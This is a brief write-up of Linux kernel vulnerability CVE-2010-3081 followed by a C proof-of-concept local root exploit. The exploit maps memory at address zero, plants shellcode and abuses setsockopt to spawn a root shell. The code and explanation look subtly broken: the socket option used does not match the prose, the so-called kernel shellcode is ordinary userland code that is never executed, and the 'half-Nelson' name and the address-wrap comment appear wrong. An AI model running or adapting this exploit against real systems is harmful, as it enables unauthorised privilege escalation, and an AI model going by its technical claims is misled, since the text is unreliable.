The exploit for CVE-2010-3081, often referred to as the "half-Nelson" exploit, triggers a stack pointer underflow in the `compat_alloc_user_space` function. This is typically achieved by invoking the `setsockopt` syscall from a 32-bit application on a 64-bit kernel with the `MCAST_MSFILTER` option and a large size argument. This underflow allows an attacker to write to arbitrary kernel memory and execute code to gain root privileges.

A common Proof-of-Concept (PoC) appears as follows:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/mman.h>

#define MCAST_MSFILTER 1

// Shellcode to be executed in kernel mode
char shellcode[] =
    "\x48\x31\xff\xb0\x69\x0f\x05" // setreuid(0, 0)
    "\x48\x31\xff\xb0\x70\x0f\x05" // setregid(0, 0)
    "\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68" // push "/bin//sh"
    "\x48\xc1\xef\x08"
    "\x57"
    "\x48\x89\xe7"
    "\x48\x31\xf6"
    "\x48\x31\xd2"
    "\xb0\x3b\x0f\x05";            // execve("/bin//sh", 0, 0)

int main(void) {
    int sock;
    struct ip_msfilter msf;
    unsigned long mmap_addr;

    // Map memory at address 0 to place our shellcode
    mmap_addr = (unsigned long)mmap((void *)0x0, 0x1000,
                                   PROT_READ | PROT_WRITE | PROT_EXEC,
                                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (mmap_addr != 0) {
        perror("mmap");
        return 1;
    }
    memcpy((void *)0x100, shellcode, sizeof(shellcode));

    // Create a UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    // Prepare the msfilter structure
    msf.imsf_multiaddr.s_addr = 0;
    msf.imsf_interface.s_addr = 0;
    msf.imsf_fmode = MCAST_MSFILTER;
    msf.imsf_numsrc = 1;
    msf.imsf_slist[0].s_addr = 0;

    // Trigger the vulnerability with a large optlen
    // This value causes the stack pointer to underflow and wrap to address 0
    if (setsockopt(sock, IPPROTO_IP, IP_MSFILTER, &msf, 0x80000000) < 0) {
        perror("setsockopt");
    }

    // If successful, we now have a root shell
    if (getuid() == 0) {
        printf("Successfully gained root privileges!\n");
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("Exploit failed.\n");
    }

    close(sock);
    return 0;
}
